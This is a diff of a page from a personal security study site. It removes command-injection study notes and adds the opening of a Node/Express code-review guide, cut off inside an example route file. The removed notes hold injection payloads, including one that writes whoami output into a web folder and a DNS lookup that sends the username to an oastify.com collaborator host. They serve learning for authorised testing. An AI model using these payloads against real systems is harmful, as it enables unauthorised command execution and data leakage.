@@ -9,28 +9,24 @@
       
       
       
-        <link rel="prev" href="../business-logic-vulnerabilities/">
-      
-      
-        <link rel="next" href="../cross-site-scripting/">
       
       
         
       
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Command Injection - Dan's Cyber Stuff</title>
+        <title>Code Review - Node / Express - Dan's Cyber Stuff</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -49,7 +45,7 @@
       
     
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -74,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#command-injection" class="md-skip">
+        <a href="#code-review-node-express" class="md-skip">
           Skip to content
         </a>
       
@@ -90,7 +86,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -110,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Command Injection
+              Code Review - Node / Express
             
           </span>
         </div>
@@ -214,7 +210,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -232,7 +228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -306,7 +302,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../whitebox-testing/whitebox-testing/" class="md-nav__link">
+      <a href="../whitebox-testing/" class="md-nav__link">
         
   
   
@@ -334,7 +330,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../whitebox-testing/process/" class="md-nav__link">
+      <a href="../process/" class="md-nav__link">
         
   
   
@@ -416,7 +412,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../tools/" class="md-nav__link">
+      <a href="../../tools/" class="md-nav__link">
         
   
   
@@ -444,7 +440,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../tools/vscode/" class="md-nav__link">
+      <a href="../../tools/vscode/" class="md-nav__link">
         
   
   
@@ -476,20 +472,18 @@
       
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
@@ -510,7 +504,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -528,7 +522,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../" class="md-nav__link">
+      <a href="../../study-notes/" class="md-nav__link">
         
   
   
@@ -603,7 +597,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../owasp-top-10-2025/" class="md-nav__link">
+      <a href="../../study-notes/owasp-top-10-2025/" class="md-nav__link">
         
   
   
@@ -631,7 +625,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reconnaissance/" class="md-nav__link">
+      <a href="../../study-notes/reconnaissance/" class="md-nav__link">
         
   
   
@@ -659,7 +653,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reporting-and-poc/" class="md-nav__link">
+      <a href="../../study-notes/reporting-and-poc/" class="md-nav__link">
         
   
   
@@ -687,7 +681,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tech-interview-prep/" class="md-nav__link">
+      <a href="../../study-notes/tech-interview-prep/" class="md-nav__link">
         
   
   
@@ -720,20 +714,18 @@
                 
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
         
           
           <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
@@ -754,7 +746,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -772,7 +764,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../" class="md-nav__link">
+      <a href="../../study-notes/bscp-study-notes/" class="md-nav__link">
         
   
   
@@ -800,7 +792,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../authentication-vulnerabilities/" class="md-nav__link">
+      <a href="../../study-notes/bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -828,7 +820,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../business-logic-vulnerabilities/" class="md-nav__link">
+      <a href="../../study-notes/bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -853,37 +845,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Command Injection
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../study-notes/bscp-study-notes/command-injection/" class="md-nav__link">
         
   
   
@@ -899,59 +864,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#userful-commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Userful Commands
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#command-separaters" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Command Separaters
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#testing" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Testing
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -964,7 +876,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cross-site-scripting/" class="md-nav__link">
+      <a href="../../study-notes/bscp-study-notes/cross-site-scripting/" class="md-nav__link">
         
   
   
@@ -992,7 +904,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../path-traversal/" class="md-nav__link">
+      <a href="../../study-notes/bscp-study-notes/path-traversal/" class="md-nav__link">
         
   
   
@@ -1020,7 +932,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sql-injection/" class="md-nav__link">
+      <a href="../../study-notes/bscp-study-notes/sql-injection/" class="md-nav__link">
         
   
   
@@ -1103,7 +1015,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/" class="md-nav__link">
+      <a href="../../study-notes/cwee-study-notes/" class="md-nav__link">
         
   
   
@@ -1131,7 +1043,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
+      <a href="../../study-notes/cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
         
   
   
@@ -1159,7 +1071,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/injection-attacks/" class="md-nav__link">
+      <a href="../../study-notes/cwee-study-notes/injection-attacks/" class="md-nav__link">
         
   
   
@@ -1187,7 +1099,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
+      <a href="../../study-notes/cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
         
   
   
@@ -1215,7 +1127,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
+      <a href="../../study-notes/cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
         
   
   
@@ -1298,7 +1210,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/api-attacks/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/api-attacks/" class="md-nav__link">
         
   
   
@@ -1326,7 +1238,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/attacking-common-applications/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/attacking-common-applications/" class="md-nav__link">
         
   
   
@@ -1354,7 +1266,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/attacking-graphql/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/attacking-graphql/" class="md-nav__link">
         
   
   
@@ -1382,7 +1294,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
         
   
   
@@ -1410,7 +1322,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/broken-authentication/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/broken-authentication/" class="md-nav__link">
         
   
   
@@ -1438,7 +1350,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/command-injections/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/command-injections/" class="md-nav__link">
         
   
   
@@ -1466,7 +1378,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
         
   
   
@@ -1494,7 +1406,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/file-inclusion/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/file-inclusion/" class="md-nav__link">
         
   
   
@@ -1522,7 +1434,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/file-upload-attacks/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/file-upload-attacks/" class="md-nav__link">
         
   
   
@@ -1550,7 +1462,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/hacking-wordpress/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/hacking-wordpress/" class="md-nav__link">
         
   
   
@@ -1578,7 +1490,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -1606,7 +1518,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/login-brute-forcing/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/login-brute-forcing/" class="md-nav__link">
         
   
   
@@ -1634,7 +1546,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/server-side-attacks/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/server-side-attacks/" class="md-nav__link">
         
   
   
@@ -1662,7 +1574,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/session-security/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/session-security/" class="md-nav__link">
         
   
   
@@ -1690,7 +1602,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
         
   
   
@@ -1718,7 +1630,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
         
   
   
@@ -1746,7 +1658,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/web-attacks/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/web-attacks/" class="md-nav__link">
         
   
   
@@ -1774,7 +1686,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/web-fuzzing/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/web-fuzzing/" class="md-nav__link">
         
   
   
@@ -1802,7 +1714,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
+      <a href="../../study-notes/cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
         
   
   
@@ -1885,7 +1797,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/" class="md-nav__link">
+      <a href="../../study-notes/android-application-pentesting/" class="md-nav__link">
         
   
   
@@ -1913,7 +1825,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/android-fundamentals/" class="md-nav__link">
+      <a href="../../study-notes/android-application-pentesting/android-fundamentals/" class="md-nav__link">
         
   
   
@@ -1941,7 +1853,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
+      <a href="../../study-notes/android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
         
   
   
@@ -1969,7 +1881,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
+      <a href="../../study-notes/android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
         
   
   
@@ -2052,7 +1964,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/curl/" class="md-nav__link">
+      <a href="../../study-notes/tools-and-protocols/curl/" class="md-nav__link">
         
   
   
@@ -2080,7 +1992,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/ftp/" class="md-nav__link">
+      <a href="../../study-notes/tools-and-protocols/ftp/" class="md-nav__link">
         
   
   
@@ -2108,7 +2020,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/gobuster/" class="md-nav__link">
+      <a href="../../study-notes/tools-and-protocols/gobuster/" class="md-nav__link">
         
   
   
@@ -2136,7 +2048,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/nmap/" class="md-nav__link">
+      <a href="../../study-notes/tools-and-protocols/nmap/" class="md-nav__link">
         
   
   
@@ -2199,10 +2111,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#userful-commands" class="md-nav__link">
+  <a href="#1-open-the-project" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Userful Commands
+        1. Open the project
       
     </span>
   </a>
@@ -2210,10 +2122,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#command-separaters" class="md-nav__link">
+  <a href="#2-find-and-review-the-entry-point" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Command Separaters
+        2. Find and review the entry point
       
     </span>
   </a>
@@ -2221,10 +2133,60 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#testing" class="md-nav__link">
+  <a href="#3-trace-each-endpoint" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Testing
+        3. Trace each endpoint
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Trace each endpoint">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-route-file-routesauth-routesjs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example route file (routes/auth-routes.js)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-controller-controllersauth-controllerjs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example controller (controllers/auth-controller.js)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-shortlist-interesting-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Shortlist interesting code
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-check-dependencies-for-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Check dependencies for vulnerabilities
       
     </span>
   </a>
@@ -2248,94 +2210,207 @@
 
 
 
-<h1 id="command-injection">Command Injection</h1>
-<h2 id="userful-commands">Userful Commands</h2>
-<table>
-<thead>
-<tr>
-<th>Purpose of command</th>
-<th>Linux</th>
-<th>Windows</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Name of current user</td>
-<td>whoami</td>
-<td>whoami</td>
-</tr>
-<tr>
-<td>Operating system</td>
-<td>uname -a</td>
-<td>ver</td>
-</tr>
-<tr>
-<td>Network configuration</td>
-<td>ifconfig</td>
-<td>ipconfig /all</td>
-</tr>
-<tr>
-<td>Network connections</td>
-<td>netstat -an</td>
-<td>netstat -an</td>
-</tr>
-<tr>
-<td>Running processes</td>
-<td>ps -ef</td>
-<td>tasklist</td>
-</tr>
-</tbody>
-</table>
-<h2 id="command-separaters">Command Separaters</h2>
-<table>
-<thead>
-<tr>
-<th>Separater</th>
-<th>OS</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>&amp;</code></td>
-<td>Windows &amp; Unix</td>
-</tr>
-<tr>
-<td><code>&amp;&amp;</code></td>
-<td>Windows &amp; Unix</td>
-</tr>
-<tr>
-<td><code>\|</code></td>
-<td>Windows &amp; Unix</td>
-</tr>
-<tr>
-<td><code>\|\|</code></td>
-<td>Windows &amp; Unix</td>
-</tr>
-<tr>
-<td><code>;</code></td>
-<td>Unix</td>
-</tr>
-<tr>
-<td>Newline (<code>0x0a</code> or <code>\n</code>)</td>
-<td>Unix</td>
-</tr>
-<tr>
-<td><code>`whoami`</code></td>
-<td>Unix</td>
-</tr>
-<tr>
-<td><code>$(whoami)</code></td>
-<td>Unix</td>
-</tr>
-</tbody>
-</table>
-<h2 id="testing">Testing</h2>
-<ul>
-<li>Try echoing some thing <code>&amp; echo aiwefwlguh &amp;</code></li>
-<li>Try triggering a time delay (good for blind command injections)<code>&amp; ping -c 10 127.0.0.1 &amp;</code> or <code>||ping+-c+10+127.0.0.1||</code></li>
-<li>Try writing to accessible file locations <code>||whoami+&gt;+/var/www/images/whoami.txt||</code> and using existing get requests to retrieve the file if required</li>
-<li>Try OAST with nslookup <code>||nslookup+`whoami`.kxlxaeaaophnwecushvxqmz2ltrkfa3z.oastify.com||</code></li>
-</ul>
+<h1 id="code-review-node-express">Code Review - Node / Express</h1>
+<h2 id="1-open-the-project">1. Open the project</h2>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">code<span class="w"> </span>./project-folder
+</span></code></pre></div></td></tr></table></div>
+<h2 id="2-find-and-review-the-entry-point">2. Find and review the entry point</h2>
+<p>Look for <code>app.js</code>, <code>server.js</code> or <code>index.js</code> (entry point).</p>
+<p>Example entry point:</p>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="c1">// ===== Requirements, initialisation and port =====</span>
+</span><span id="__span-1-2">
+</span><span id="__span-1-3"><span class="c1">// Import required libraries</span>
+</span><span id="__span-1-4"><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span><span class="w">                         </span>
+</span><span id="__span-1-5"><span class="kd">const</span><span class="w"> </span><span class="nx">cors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cors&#39;</span><span class="p">);</span>
+</span><span id="__span-1-6">
+</span><span id="__span-1-7"><span class="c1">// Import route files</span>
+</span><span id="__span-1-8"><span class="kd">const</span><span class="w"> </span><span class="nx">authRoutes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/auth-routes&#39;</span><span class="p">);</span><span class="w">         </span>
+</span><span id="__span-1-9"><span class="kd">const</span><span class="w"> </span><span class="nx">serviceRoutes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/service-routes&#39;</span><span class="p">);</span>
+</span><span id="__span-1-10">
+</span><span id="__span-1-11"><span class="c1">// Initialise express object</span>
+</span><span id="__span-1-12"><span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">();</span>
+</span><span id="__span-1-13">
+</span><span id="__span-1-14"><span class="c1">// Define port</span>
+</span><span id="__span-1-15"><span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5000</span><span class="p">;</span>
+</span><span id="__span-1-16"><span class="c1">// =========================================</span>
+</span><span id="__span-1-17">
+</span><span id="__span-1-18"><span class="c1">// ===== Global middleware goes here, these run on every request before routes =====</span>
+</span><span id="__span-1-19">
+</span><span id="__span-1-20"><span class="c1">// Parses the raw HTTP request body JSON string into a JavaScript object stored in req.body</span>
+</span><span id="__span-1-21"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span><span class="w">    </span>
+</span><span id="__span-1-22">
+</span><span id="__span-1-23"><span class="c1">// Handles Cross-Origin requests and adds specified HTTP response headers</span>
+</span><span id="__span-1-24"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cors</span><span class="p">({</span><span class="w">                  </span>
+</span><span id="__span-1-25"><span class="w">    </span><span class="nx">origin</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://frontend.example.com&#39;</span><span class="p">,</span>
+</span><span id="__span-1-26"><span class="w">    </span><span class="nx">methods</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">],</span>
+</span><span id="__span-1-27"><span class="w">    </span><span class="nx">allowedHeaders</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Authorization&#39;</span><span class="p">]</span>
+</span><span id="__span-1-28"><span class="p">}));</span><span class="w">     </span>
+</span><span id="__span-1-29"><span class="c1">// =================================================================================</span>
+</span><span id="__span-1-30">
+</span><span id="__span-1-31"><span class="c1">// ===== Mounted routes =====</span>
+</span><span id="__span-1-32">
+</span><span id="__span-1-33"><span class="c1">// Mount the imported routes under their path prefix</span>
+</span><span id="__span-1-34"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">&quot;/api/auth&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">authRoutes</span><span class="p">);</span>
+</span><span id="__span-1-35"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">&quot;/api/service&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">serviceRoutes</span><span class="p">);</span>
+</span><span id="__span-1-36"><span class="c1">// ===========================</span>
+</span><span id="__span-1-37">
+</span><span id="__span-1-38"><span class="c1">// ===== Start server =====</span>
+</span><span id="__span-1-39">
+</span><span id="__span-1-40"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-41"><span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span><span id="__span-1-42"><span class="p">});</span>
+</span><span id="__span-1-43"><span class="c1">// ========================</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="3-trace-each-endpoint">3. Trace each endpoint</h2>
+<p>Note:
+- Any handling of <code>req.body</code>, <code>req.query</code>, <code>req.headers</code>, <code>req.params</code>.
+- Any auth checks / middleware.
+- What the controller functions actually do.</p>
+<p>To trace to the route file CTRL/CMD + click on either:
+- <code>authRoutes</code> (the variable)
+- <code>'./routes/auth-routes'</code> (the path string)</p>
+<h3 id="example-route-file-routesauth-routesjs">Example route file (<code>routes/auth-routes.js</code>)</h3>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
